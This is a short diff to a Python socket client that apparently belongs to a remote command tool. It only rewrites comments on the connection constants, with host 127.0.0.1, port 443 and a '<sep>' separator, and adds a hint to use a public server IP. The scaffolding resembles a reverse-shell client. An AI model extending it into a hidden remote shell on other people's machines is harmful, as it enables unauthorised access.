@@ -3,11 +3,18 @@ import os
 import subprocess
 import sys
 
-''' TODO: Move this to a .env? '''
-SERVER_HOST = '127.0.0.1'
-SERVER_PORT = 443
-BUFFER_SIZE = 1024 * 128 # 128KB max mesxage
-SEPARATOR = '<sep>'
+""" Constants 
+
+These defaults will work for testing both the client and server on the
+same machine; for remote access, ensure the SERVER_HOST address is 
+replaced with the server's public IP.
+
+If desired, these constants can be moved to a dotenv configuration file.
+"""
+SERVER_HOST = '127.0.0.1' # Public IP of server
+SERVER_PORT = 443 # Open port on server
+BUFFER_SIZE = 1024 * 128 # 128KB max mesxage; can be reconfigured as desired
+SEPARATOR = '<sep>' # Separator between multiple sent messages
 
 s = socket.socket()
 s.connect((SERVER_HOST, SERVER_PORT))
